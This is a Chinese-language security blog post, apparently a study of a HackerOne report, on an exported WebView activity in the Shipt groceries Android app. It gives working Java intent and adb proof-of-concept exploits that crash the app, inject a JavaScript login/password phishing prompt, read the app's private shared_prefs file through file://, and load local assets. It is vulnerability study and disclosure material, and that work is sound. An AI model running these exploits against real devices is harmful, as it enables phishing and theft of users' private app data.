@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="tea9">
+
+
+    <meta name="subtitle" content="加油">
+
+
+    <meta name="description" content="心中有光の孩子 提示：图片都存到了github仓库需要挂代理才能看到">
+
+
+    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
+
+
+<title>漏洞学习|攻击导出的WebView Activity | tea9のblog</title>
+
+
+
+    <link rel="icon" href="/image/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">漏洞学习|攻击导出的WebView Activity</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">九月 5, 2023&nbsp;&nbsp;20:09:23</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Security/">Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="漏洞学习-攻击导出的WebView-Activity"><a href="#漏洞学习-攻击导出的WebView-Activity" class="headerlink" title="漏洞学习|攻击导出的WebView Activity"></a>漏洞学习|攻击导出的WebView Activity</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>com.pushio.manager.iam.ui.PushIOMessageViewActivity已将导出设置为 true 使该活动容易受到攻击。 </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.pushio.manager.iam.ui.PushIOMessageViewActivity&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@android:style/Theme.Translucent.NoTitleBar&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;@string/responsys_api_key&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>com.pushio.manager.iam.ui.PushIOMessageViewActivity允许与WebView交互的类中的一个问题：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">rotected <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">()</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="type">Bundle</span> <span class="variable">extras</span> <span class="operator">=</span> getIntent().getExtras();</span><br><span class="line">PIOLogger.d(<span class="string">&quot;PIOMVA oS extras: &quot;</span> + extras);</span><br><span class="line"><span class="keyword">if</span> (extras != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> extras.getString(Param.CONTENT);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> extras.getString(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">viewType</span> <span class="operator">=</span> extras.getString(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (TextUtils.isEmpty(viewType)) &#123;</span><br><span class="line">        PIOLogger.w(<span class="string">&quot;PIOMVA oS view type not found, closing window...&quot;</span>);</span><br><span class="line">        finish();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (viewType.equalsIgnoreCase(PushIOMessageViewType.ALERT.toString())) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (PushIOMessageViewActivity.<span class="built_in">this</span>.mActivityWeakReference != <span class="literal">null</span> &amp;&amp; PushIOMessageViewActivity.<span class="built_in">this</span>.mActivityWeakReference.get() != <span class="literal">null</span> &amp;&amp; !((Activity) PushIOMessageViewActivity.<span class="built_in">this</span>.mActivityWeakReference.get()).isFinishing()) &#123;</span><br><span class="line">                PushIOMessageViewActivity.<span class="built_in">this</span>.mPopupWindow.showAtLocation(PushIOMessageViewActivity.<span class="built_in">this</span>.mParentLayout, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (!TextUtils.isEmpty(content)) &#123;</span><br><span class="line">                    PushIOMessageViewActivity.<span class="built_in">this</span>.mWebView.loadDataWithBaseURL(<span class="literal">null</span>, content, <span class="string">&quot;text/html&quot;</span>, <span class="string">&quot;utf-8&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (TextUtils.isEmpty(url)) &#123;</span><br><span class="line">                    PushIOMessageViewActivity.<span class="built_in">this</span>.finish();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    PushIOMessageViewActivity.<span class="built_in">this</span>.mWebView.loadUrl(url);<span class="comment">//load custom url</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (BadTokenException e) &#123;</span><br><span class="line">            PIOLogger.d(<span class="string">&quot;PIOMVA oSt &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>借助特殊意图，可以传递if块并加载您自己的 URL 地址或 Javascript。<br>看上面代码走到else就可以加载任意url且没有做任何限制。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PushIOMessageViewActivity.<span class="built_in">this</span>.mWebView.loadUrl(url);<span class="comment">//load custom url</span></span><br></pre></td></tr></table></figure>
+<p>您可以通过控制台 adb 或通过我的应用程序 HunterExploit 利用此漏洞<br>PoC 1 - 终止进程 - 允许停止shipt进程 - 信息可用性的威胁 Java PoC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.shipt.groceries&quot;</span>, <span class="string">&quot;com.pushio.manager.iam.ui.PushIOMessageViewActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;chrome://crash&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;alert&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+<p>ADB Poc:<br>adb shell am start -n com.shipt.groceries&#x2F;com.pushio.manager.iam.ui.PushIOMessageViewActivity -a “android.intent.action.VIEW” –es “url” “chrome:&#x2F;&#x2F;crash” –es “type” “alert”</p>
+<p>PoC 2 - XSS - 允许网络钓鱼攻击 Java PoC：<br>可以在应用内打开钓鱼网站的链接</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.shipt.groceries&quot;</span>, <span class="string">&quot;com.pushio.manager.iam.ui.PushIOMessageViewActivity&quot;</span>);</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">intent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;javascript:&#123;var Login = window.prompt(\&quot;Authorization: Login\&quot;, \&quot;Input Login\&quot;);var Password = window.prompt(\&quot;Authorization: Password\&quot;, \&quot;Input Password\&quot;); alert(&#x27;Interception of data: &#x27;+Login+&#x27; &#x27;+Password)&#125;&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;alert&quot;</span>);</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intentStart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_MAIN);</span><br><span class="line">intentStart.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;com.shipt.groceries&quot;</span>, <span class="string">&quot;com.shipt.groceries.MainActivity&quot;</span>));</span><br><span class="line">startActivity(intentStart);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> startActivity(intent);</span><br></pre></td></tr></table></figure>
+<p>ADB PoC:<br>adb shell am start -n com.shipt.groceries&#x2F;com.shipt.groceries.MainActivity Wait for the application to load, and then run the following command adb shell am start -n com.shipt.groceries&#x2F;com.pushio.manager.iam.ui.PushIOMessageViewActivity -a “android.intent.action.VIEW” –es “url” “javascript:{window.prompt(&#39;Authorization:Login&#39;,&#39;Input_Login&#39;);window.prompt(&#39;Authorization:Password&#39;,&#39;Input_Password&#39;)}” –es “type” “alert”<br>PoC 3 - LFI - 允许您在没有 root 访问权限的情况下读取机密用户文件 - 信息机密性 Java PoC 的威胁：<br>访问应用内沙箱文件，如果登录信息明文存储在shared_prefs里也可用于窃取登录信息</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.shipt.groceries&quot;</span>, <span class="string">&quot;com.pushio.manager.iam.ui.PushIOMessageViewActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;file:///data/data/com.shipt.groceries/shared_prefs/pushio_store.xml&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;alert&quot;</span>);</span><br><span class="line"></span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+<p>ADB PoC:<br>adb shell am start -n com.shipt.groceries&#x2F;com.pushio.manager.iam.ui.PushIOMessageViewActivity -a “android.intent.action.VIEW” –es “url” “file:&#x2F;&#x2F;&#x2F;data&#x2F;data&#x2F;com.shipt.groceries&#x2F;shared_prefs&#x2F;pushio_store.xml” –es “type” “alert”<br>PoC 4 - 读取文件或加载android_asset Java PoC：<br>加载本地html可用于xss攻击</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.shipt.groceries&quot;</span>, <span class="string">&quot;com.pushio.manager.iam.ui.PushIOMessageViewActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;file:///android_asset/www/index.html&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;alert&quot;</span>);</span><br><span class="line"></span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+<p>ADB PoC:<br>adb shell am start -n com.shipt.groceries&#x2F;com.pushio.manager.iam.ui.PushIOMessageViewActivity -a “android.intent.action.VIEW” –es “url” “file:&#x2F;&#x2F;&#x2F;android_asset&#x2F;www&#x2F;index.html” –es “type” “alert”</p>
+<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><ol>
+<li>攻击者可以通过欺骗用户的信任来在 Shipt 应用程序中加载 JavaScript。</li>
+<li>无需 root 访问权限即可读取用户的个人文件。</li>
+<li>破坏Shipt进程。</li>
+<li>从 android_asset 文件中读取应用程序文件。</li>
+<li>对 WebView 的访问为攻击者提供了许多可能的利用机会。</li>
+</ol>
+<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/414101">https://hackerone.com/reports/414101</a><br><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/02/12/android-webview-vulnerabilities/">https://pentestlab.blog/2017/02/12/android-webview-vulnerabilities/</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>tea9</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://tea9.xyz/post/1470843549.html">http://tea9.xyz/post/1470843549.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2017-2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/android%E5%AE%89%E5%85%A8/"># android安全</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/post/379246801.html">公开web漏洞报告逻辑分析整理[持续更新]</a>
+            
+            
+            <a class="next" rel="next" href="/post/2929787392.html">Deep Link利用：开放重定向</a>
+            
+        </section>
+    </article>
+</div>
+
+
+
+
+            </div>
+            <footer id="footer" class="footer">
+ 
+    <div class="copyright">
+        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+   
+</footer>
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-hijiki"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
